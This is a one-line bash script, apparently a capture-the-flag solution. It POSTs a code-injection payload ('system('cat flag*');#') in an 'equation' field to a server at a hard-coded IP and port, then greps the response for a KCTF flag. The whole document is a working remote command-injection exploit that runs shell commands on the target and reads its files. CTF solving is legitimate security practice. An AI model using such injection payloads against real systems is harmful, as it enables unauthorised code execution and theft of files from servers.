#!/bin/bash

curl -s -X POST http://198.211.115.81:9003/ -d "equation=system('cat flag*');#" | grep "KCTF{.*" | tail -1 | cut -d '<' -f1